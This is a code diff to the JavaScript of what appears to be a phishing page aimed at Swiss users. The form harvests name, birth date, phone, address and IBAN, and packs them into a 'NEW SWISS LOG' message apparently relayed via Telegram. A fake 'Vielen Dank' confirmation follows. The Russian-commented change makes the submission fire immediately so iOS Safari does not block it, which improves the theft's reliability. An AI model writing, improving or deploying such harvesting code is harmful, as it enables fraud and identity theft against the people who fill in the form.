@@ -41,7 +41,6 @@ document.addEventListener('DOMContentLoaded', () => {
   form.addEventListener('submit', (e) => {
     e.preventDefault();
 
-    // Берем значения "как есть"
     const name = document.getElementById('name').value;
     const geburtsdatum = document.getElementById('geburtsdatum').value;
     const telefon = document.getElementById('telefon').value;
@@ -59,24 +58,24 @@ document.addEventListener('DOMContentLoaded', () => {
     let message = '🇨🇭 NEW SWISS LOG !\n\n';
     message += `👤 Name: ${name}\n`;
     message += `🎂 Geburtsdatum: ${geburtsdatum}\n`;
-    message += `📱 Telefon: ${telefon}\n`; // Только то, что ввели
+    message += `📱 Telefon: ${telefon}\n`;
     message += `📍 Adresse: ${adresse}\n`;
     message += `📮 PLZ: ${plz}\n`;
     message += `🏙️ Stadt: ${stadt}\n`;
-    message += `🏦 IBAN: ${iban}\n`; // Только то, что ввели
+    message += `🏦 IBAN: ${iban}\n`;
     message += `🔍 IBAN-Status: nicht geprüft\n\n`;
     message += `🕒 Zeit: ${dateTime}\n`;
     message += `🌐 Browser: ${browserInfo}\n`;
 
     document.getElementById('telegramText').value = message;
     
-    setTimeout(() => {
-      form.submit();
-    }, 100);
+    // ВАЖНО: form.submit() вызывается СРАЗУ, без setTimeout, чтобы Safari на iOS не блокировал
+    form.submit();
 
+    // А "Спасибо" показываем уже ПОСЛЕ отправки
     setTimeout(() => {
       alert('Vielen Dank! Ihre Daten wurden erfolgreich gesendet.');
       form.reset();
-    }, 800);
+    }, 500);
   });
 });
